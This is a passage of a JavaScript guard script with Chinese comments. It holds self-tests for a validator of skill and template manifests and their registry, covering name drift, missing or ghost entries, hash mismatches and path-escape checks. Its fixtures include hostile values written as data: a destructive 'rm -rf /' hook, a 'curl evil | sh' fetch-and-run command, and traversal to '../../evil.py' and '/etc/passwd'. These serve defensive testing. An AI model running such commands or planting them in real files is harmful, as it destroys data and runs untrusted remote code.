    join(fx.dir, REGISTRY_REL),
    `${JSON.stringify(registry, null, 2)}\n`,
    "utf8",
  );
  return fx;
}

/** 读 fixture 树里某个 JSON 文件并改它（写回）。 */
function patchJson(fx, rel, mutate) {
  const abs = join(fx.dir, rel);
  const value = JSON.parse(readFileSync(abs, "utf8"));
  mutate(value);
  writeFileSync(abs, `${JSON.stringify(value, null, 2)}\n`, "utf8");
}

async function selftest() {
  const cases = [];
  /**
   * 注册一条用例：**用例体内**建 fixture、跑断言、最后清理。
   *
   * 为什么 fixture 的建/清都在用例体内：早先把 fixture 建在用例**注册**时、
   * 在**注册完所有用例后**统一清理，于是每条用例真正执行时目录已被删掉——
   * 守卫因「--root 目录不存在」退 2，负例全红而正例也红（自检自身是坏的）。
   * 这正是 harness 头注说的那类假绿/假红：断言本身有本事失败，但失败原因
   * 与被测判据无关。
   */
  const add = (name, fn) => cases.push({ name, fn });
  /** 建 fixture → 跑 fn → 清理（清理失败也要报出来）。 */
  const withFixture = (build, fn) => () => {
    const fx = build();
    try {
      return fn(fx);
    } finally {
      fx.cleanup();
    }
  };

  // ① 正例控制组：干净树必须绿（否则「一律判红」的守卫也能让负例全绿）
  add(
    "正例控制组：干净的技能/模板树 ⇒ 退出 0、无 error",
    withFixture(cleanFixture, (fx) => {
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 0,
        contains: ["PASS", "0 error(s)"],
        absent: ["ERROR", "缺登记", "幽灵条目", "内容不一致"],
        label: "正例控制组（fixture）",
      });
    }),
  );
  add("正例控制组：真实仓库必须绿（事实源真的连得上、守卫真的在跑）", () => {
    const r = runGuard(SELF, { args: [] });
    expectExit(r, {
      code: 0,
      contains: ["PASS"],
      absent: ["ERROR"],
      label: "正例控制组（真实仓库）",
    });
  });

  // ② 目录改名而 manifest.name 不变 ⇒ 红（name 必须逐字等于目录名）
  add(
    "目录改名而 manifest.name 不变 ⇒ 红（name 必须逐字等于目录名）",
    withFixture(cleanFixture, (fx) => {
      renameSync(
        join(fx.dir, "docs/skills/demo-skill"),
        join(fx.dir, "docs/skills/renamed-skill"),
      );
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["必须逐字等于目录名", "renamed-skill"],
        label: "目录改名",
      });
    }),
  );

  // ③ 从 registry.json 删一条 ⇒ 报「缺登记」
  add(
    "registry.json 删一条 ⇒ 红并报「缺登记」",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, REGISTRY_REL, (doc) => {
        doc.skills = doc.skills.filter((row) => row.name !== "demo-skill");
      });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["缺登记", "demo-skill"],
        label: "缺登记",
      });
    }),
  );

  // ④ registry 里塞一条幽灵条目 ⇒ 红并报「幽灵条目」
  add(
    "registry.json 多一条无清单的条目 ⇒ 红并报「幽灵条目」",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, REGISTRY_REL, (doc) => {
        doc.skills.push({
          name: "ghost-skill",
          path: "docs/skills/ghost-skill",
          version: "1.0.0",
          description: "幽灵条目",
          capabilities: [],
          params: {},
          entrypoints: [],
          contentHash: "0".repeat(64),
        });
      });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["幽灵条目", "ghost-skill"],
        label: "幽灵条目",
      });
    }),
  );

  // ⑤ entrypoint 写 ../../evil.py ⇒ 拒绝（canonicalize 越界）
  add(
    "entrypoint 写 ../../evil.py ⇒ 拒绝（canonicalize 越界）",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, "docs/skills/demo-skill/manifest.json", (doc) => {
        doc.entrypoints = ["../../evil.py"];
      });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["越界", "../../evil.py"],
        label: "entrypoint 越界",
      });
    }),
  );

  // ⑤b entrypoint 写绝对路径 ⇒ 拒绝
  add(
    "entrypoint 写绝对路径 ⇒ 拒绝",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, "docs/skills/demo-skill/manifest.json", (doc) => {
        doc.entrypoints = ["/etc/passwd"];
      });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["绝对路径"],
        label: "entrypoint 绝对路径",
      });
    }),
  );

  // ⑤c entrypoint 是**指向目录外的 symlink** ⇒ 拒绝（实施方自报的绕过点）。
  // 词法 `path.resolve` + `startsWith` **不解析符号链接**，所以目录内一个指向外部的
  // 链接能溜过去；本条把它钉死（判据用 realpath）。
  add(
    "entrypoint 指向目录外的 symlink ⇒ 拒绝",
    withFixture(cleanFixture, (fx) => {
      const outside = join(fx.dir, "outside.py");
      writeFileSync(outside, "print('x')\n", "utf8");
      const link = join(fx.dir, "docs/skills/demo-skill/link.py");
      try {
        symlinkSync(outside, link);
      } catch {
        // 本机不允许建 symlink（Windows/无权限）⇒ 该用例无法在此环境成立，
        // 跳过而不是伪装成通过（守卫自检要求每条都能断言）。
        return;
      }
      patchJson(fx, "docs/skills/demo-skill/manifest.json", (doc) => {
        doc.entrypoints = ["link.py"];
      });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["越界"],
        label: "entrypoint symlink 越界",
      });
    }),
  );

  // ⑥ 清单带未知键 ⇒ 红（SOP 同款「未知键即失败」）
  add(
    "清单带未知键（hook）⇒ 红（未知键即失败；清单不承载可执行 hook）",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, "docs/skills/demo-skill/manifest.json", (doc) => {
        doc.hook = "rm -rf /";
      });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["未知键 manifest.hook"],
        label: "未知键",
      });
    }),
  );

  // ⑥b params 里塞未知键 ⇒ 红
  add(
    "params 里塞未知键（command）⇒ 红",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, "docs/skills/demo-skill/manifest.json", (doc) => {
        doc.params.targetDir.command = "curl evil | sh";
      });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["未知键 manifest.params.targetDir.command"],
        label: "params 未知键",
      });
    }),
  );

  // ⑦ 技能目录缺 manifest.json ⇒ 红
  add(
    "技能目录缺 manifest.json ⇒ 红",
    withFixture(cleanFixture, (fx) => {
      mkdirSync(join(fx.dir, "docs/skills/no-manifest"), { recursive: true });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["缺 manifest.json", "no-manifest"],
        label: "缺清单",
      });
    }),
  );

  // ⑧ 结构红：整个 docs/skills 目录读不到 ⇒ 红（不是绿）
  add(
    "结构红：docs/skills 目录读不到 ⇒ 红（不是绿）",
    withFixture(
      () =>
        makeFixtureRepo({
          "apps/admin-api/src/modules/sop/sop-frontmatter.ts":
            'export const SOP_CAPABILITIES = [\n  "browser",\n  "gui",\n  "filesystem",\n  "http",\n] as const;\n',
          "apps/admin-api/src/modules/task-template/task-template.constants.ts":
            'export const OFFICIAL_TASK_TEMPLATES = [\n  {\n    key: "demo_template",\n    name: "演示模板",\n    description: "官方演示模板的描述。",\n    category: "演示",\n    config: {\n      glueSource: "var url = paramValue(\'url\');\\n",\n    },\n  },\n];\n',
        }),
      (fx) => {
        const r = runGuard(SELF, { args: ["--root", fx.dir] });
        expectExit(r, {
          code: 1,
          contains: ["读不到技能目录"],
          label: "结构红（目录缺失）",
        });
      },
    ),
  );

  // ⑧b 结构红：能力域事实源读不到 ⇒ 红
  add(
    "结构红：SOP 能力域事实源读不到 ⇒ 红（不抄副本、不当绿）",
    withFixture(
      () =>
        makeFixtureRepo({
          "docs/skills/demo-skill/manifest.json": {
            name: "demo-skill",
            version: "1.0.0",
            description: "演示技能。",
            capabilities: ["filesystem"],
            params: {},
            entrypoints: [],
          },
        }),
      (fx) => {
        const r = runGuard(SELF, { args: ["--root", fx.dir] });
        expectExit(r, {
          code: 1,
          contains: ["读不到 SOP 能力域事实源"],
          label: "结构红（能力域事实源缺失）",
        });
      },
    ),
  );

  // ⑧c 结构红：官方模板事实源读不到 ⇒ 红
  add(
    "结构红：官方模板事实源读不到 ⇒ 红",
    withFixture(
      () =>
        makeFixtureRepo({
          "docs/skills/demo-skill/manifest.json": {
            name: "demo-skill",
            version: "1.0.0",
            description: "演示技能。",
            capabilities: ["filesystem"],
            params: {},
            entrypoints: [],
          },
          "apps/admin-api/src/modules/sop/sop-frontmatter.ts":
            'export const SOP_CAPABILITIES = [\n  "browser",\n  "gui",\n  "filesystem",\n  "http",\n] as const;\n',
        }),
      (fx) => {
        const r = runGuard(SELF, { args: ["--root", fx.dir] });
        expectExit(r, {
          code: 1,
          contains: ["读不到官方模板事实源"],
          label: "结构红（官方模板事实源缺失）",
        });
      },
    ),
  );

  // ⑨ 官方模板缺登记（清单目录不存在）⇒ 红
  add(
    "官方模板缺登记（清单目录被删）⇒ 红",
    withFixture(cleanFixture, (fx) => {
      rmSync(join(fx.dir, "docs/skills/templates/demo_template"), {
        recursive: true,
        force: true,
      });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["缺登记", "demo_template"],
        label: "官方模板缺登记",
      });
    }),
  );

  // ⑩ 幽灵模板目录（清单有、官方模板没有）⇒ 红
  add(
    "清单里有官方模板没有的 key ⇒ 红（幽灵条目）",
    withFixture(cleanFixture, (fx) => {
      mkdirSync(join(fx.dir, "docs/skills/templates/ghost_template"), {
        recursive: true,
      });
      writeFileSync(
        join(fx.dir, "docs/skills/templates/ghost_template/manifest.json"),
        `${JSON.stringify(
          {
            name: "ghost_template",
            version: "1.0.0",
            description: "幽灵模板。",
            capabilities: [],
            params: {},
            entrypoints: [],
          },
          null,
          2,
        )}\n`,
        "utf8",
      );
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["幽灵条目", "ghost_template"],
        label: "幽灵模板",
      });
    }),
  );

  // ⑪ --write 只补回 registry，绝不改 manifest.json
  add(
    "--write 恰好只补回缺登记那一条，且不改 manifest.json",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, REGISTRY_REL, (doc) => {
        doc.skills = doc.skills.filter((row) => row.name !== "demo-skill");
      });
      const manifestAbs = join(fx.dir, "docs/skills/demo-skill/manifest.json");
      const manifestBefore = readFileSync(manifestAbs, "utf8");
      const registryBefore = JSON.parse(readFileSync(join(fx.dir, REGISTRY_REL), "utf8"));

      const r = runGuard(SELF, { args: ["--root", fx.dir, "--write"] });
      expectExit(r, { code: 0, contains: ["PASS"], label: "--write 主跑" });

      const after = JSON.parse(readFileSync(join(fx.dir, REGISTRY_REL), "utf8"));
      const names = after.skills.map((row) => row.name);
      if (!names.includes("demo-skill")) {
        throw new Error(
          "--write 之后缺登记那条没有被补回：" + JSON.stringify(names),
        );
      }
      if (after.skills.length !== registryBefore.skills.length + 1) {
        throw new Error(
          `--write 不止补回一条：${registryBefore.skills.length} → ${after.skills.length}`,
        );
      }
      if (after.templates.length !== registryBefore.templates.length) {
        throw new Error("--write 动到了 templates 段（应只补 skills 段缺的那一条）");
      }
      const manifestAfter = readFileSync(manifestAbs, "utf8");
      if (manifestAfter !== manifestBefore) {
        throw new Error(
          "--write 改了 manifest.json —— 修复路径只能是「改清单」，不是「改清单以外的任何东西」",
        );
      }
      // 补回后的树必须自洽（再跑一次主跑 = 绿）
      const r2 = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r2, { code: 0, contains: ["PASS"], label: "--write 之后再主跑" });
    }),
  );

  // ⑫ --write 不写任何 manifest.json（内容逐字比对）
  add(
    "--write 不改 manifest.json 的内容（清单已改时也一样）",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, "docs/skills/demo-skill/manifest.json", (doc) => {
        doc.description = "改过的描述。";
      });
      const manifestAbs = join(fx.dir, "docs/skills/demo-skill/manifest.json");
      const before = readFileSync(manifestAbs, "utf8");
      const r = runGuard(SELF, { args: ["--root", fx.dir, "--write"] });
      expectExit(r, { code: 0, contains: ["PASS"], label: "--write（清单已改）" });
      const after = readFileSync(manifestAbs, "utf8");
      if (after !== before) {
        throw new Error("--write 改了 manifest.json（内容漂移）");
      }
    }),
  );

  // ⑬ 清单内容改了但 registry 没重生成 ⇒ 红（内容不一致 / hash 失配）
  add(
    "清单改了而 registry 没重生成 ⇒ 红（内容不一致）",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, "docs/skills/demo-skill/manifest.json", (doc) => {
        doc.description = "偷偷改一句。";
      });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["内容不一致", "demo-skill"],
        label: "内容不一致",
      });
    }),
  );

  // ⑭ capability 不在 SOP 四值域内 ⇒ 红
  add(
    "capability 不在 SOP 四值域内 ⇒ 红",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, "docs/skills/demo-skill/manifest.json", (doc) => {
        doc.capabilities = ["filesystem", "quantum"];
      });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["不在能力域枚举内", "quantum"],
        label: "能力域越界",
      });
    }),
  );

  // ⑮ 模板清单的 params 与官方模板胶水脚本读到的键不一致 ⇒ 红
  add(
    "模板清单的 params 与官方模板胶水脚本不一致 ⇒ 红",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, "docs/skills/templates/demo_template/manifest.json", (doc) => {
        delete doc.params.url;
        doc.params.other = { type: "string" };
      });
      const r = runGuard(SELF, { args: ["--root", fx.dir] });
      expectExit(r, {
        code: 1,
        contains: ["params 键集合与官方模板的胶水脚本不一致"],
        label: "模板 params 漂移",
      });
    }),
  );

  // ⑯ 未知参数 ⇒ 退出 2（用法错误与判据红分开）
  add("未知参数 ⇒ 退出 2（用法错误）", () => {
    const r = runGuard(SELF, { args: ["--nope"] });
    expectExit(r, { code: 2, contains: ["未知参数"], label: "用法错误" });
  });

  // ⑰ --write 在清单本身有错时**拒绝落盘**（不把坏清单固化成生成物）
  add(
    "--write 在清单本身有错时拒绝落盘（不掩盖清单问题）",
    withFixture(cleanFixture, (fx) => {
      patchJson(fx, "docs/skills/demo-skill/manifest.json", (doc) => {
        doc.entrypoints = ["../../evil.py"];
      });
      const registryAbs = join(fx.dir, REGISTRY_REL);
      const registryBefore = readFileSync(registryAbs, "utf8");
      const r = runGuard(SELF, { args: ["--root", fx.dir, "--write"] });
      expectExit(r, {
        code: 1,
        contains: ["--write 拒绝落盘", "越界"],
        absent: ["Wrote"],
        label: "--write 拒绝落盘",
      });
      const registryAfter = readFileSync(registryAbs, "utf8");
      if (registryAfter !== registryBefore) {
        throw new Error("--write 在清单有错时仍然改了 registry.json");
      }
    }),
  );

  return reportCases(cases, { title: "check-template-manifest selftest" });
}

async function main(argv) {
  const args = argv.slice(2);
  let write = false;
  let selftestMode = false;
  let root = REPO_ROOT;
  for (let i = 0; i < args.length; i += 1) {
    const a = args[i];
    if (a === "--write") write = true;
    else if (a === "--selftest") selftestMode = true;
    else if (a === "--root") {
      root = resolve(String(args[++i] ?? ""));
      if (!existsSync(root)) usageError(`--root 目录不存在：${root}`);
    } else usageError(`未知参数：${a}`);
  }

  if (selftestMode) {
    const failed = await selftest();
    process.exit(failed > 0 ? 1 : 0);
  }

  console.log(`Checking template/skill manifests under ${root}`);
  const result = await runCheck(root, { write });
  printReport(result, { root });
  process.exit(result.errors.length > 0 ? 1 : 0);
}

const invokedDirectly =
  process.argv[1] && resolve(process.argv[1]) === resolve(SELF);
if (invokedDirectly) {
  main(process.argv).catch((err) => {
    console.error(err?.stack ?? String(err));
    process.exit(2);
  });
}

export { main, selftest, fixtureFiles, fixtureRegistry };
